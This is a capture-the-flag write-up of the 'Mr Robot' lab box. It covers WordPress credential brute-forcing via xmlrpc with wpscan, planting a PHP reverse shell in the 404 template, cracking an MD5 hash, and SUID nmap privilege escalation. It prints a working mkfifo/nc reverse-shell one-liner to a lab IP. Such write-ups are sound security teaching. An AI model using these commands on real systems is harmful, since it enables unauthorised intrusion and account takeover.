---
title: Mr Robot
tags:
- writeups
---

## Recon
![[write-ups/images/Pasted image 20220823155358.png]]

### Web Analysis
If we go to the home page of the website, there's some cool looking booting animation & then we have a lot of options to choose from
![[write-ups/images/Pasted image 20220823160005.png]]

Given the box is themed around the [Mr Robot series](https://www.imdb.com/title/tt4158110/), it aludes to some of the show's topics & ideology, but nothing to helpfull for us. I ran `gobuster` in the background & decided to check out `robots.txt`, which revealed 2 files

![[write-ups/images/Pasted image 20220823160356.png]]

There's our first flag + a potential wordlist for brute-forcing somebody's password.

Going back to `gobuster` we got quite some hits:
![[write-ups/images/Pasted image 20220823160635.png]]

## From wordpress credentials to RCE
Seems that it runs WordPress => ran `wpscan` in the background. While that ran I wanted to check if I could use `xmlrpc.php` to [[|brute-force credentials]] => send this req with Burp
![[write-ups/images/Pasted image 20220823161415.png]]
Now I was looking for any of the following methods in the response: `wp.getUserBlogs`, `wp.getCategories` or `metaWeblog.getUsersBlogs`. A faster way to brute-force credentials is using `system.multicall` as we can try several credentials on the same request *(if confused, see [[Attacking Wordpress]])*

So yeah we could make `wpscan` do the work for us & run a brute-force attack *(since the theme is mr robot I figured the name should be elliot)*: `wpscan -P fsocity.dic -U elliot --password-attack xmlrpc-multicall --url http://10.10.13.131/`

I still haven't look at all the results from `gobuster`, so I tinkered through them & found a peculiar endpoint: `/license`:
```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
.... < some random data> ....
do you want a password or something?
.... < more random data> ....
ZWxsaW90OkVSMjgtMDY1Mgo=
```
Ok.. let's try base64 decode this?

![[write-ups/images/Pasted image 20220823162623.png]]

And we got the user & password 😆 without brute-forcing. However, we could have a look and see if the pass was in our dictionary: `cat fsocity.dic| grep ER28-0` which it is, so the attack would be successfull.

Now that we're in the WordPress dashboard we can go to `Appearance -> Editor -> 404 Template` & replace it with a [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Then save & navigate to a random nonexistent page to trigger our payload
![[write-ups/images/Pasted image 20220823163301.png]]

Now that we got a shell, let's do some basic enumeration.

![[write-ups/images/Pasted image 20220823163814.png]]

We can't read the 2nd flag since we're not the `robot` user, but we have it's md5 password hash. Plugging it in [crackstation](https://crackstation.net/) reveals it: `abcdefghijklmnopqrstuvwxyz`. Consequently, we can now switch to the `robot` user: 
```bash
su robot
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.12.227 1337 >/tmp/f
```

## Classic SUID privesc
Looking @ the suid files:

![[write-ups/images/Pasted image 20220823164832.png]]

We find [nmap](https://gtfobins.github.io/gtfobins/nmap/) which can be started in `--interactive` mode & be used to exeecute shell commands:
![[write-ups/images/Pasted image 20220823165000.png]]


## Refs
- [WordPress Haktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

## See Also
- [[Attacking Wordpress]]
- [[write-ups/THM]]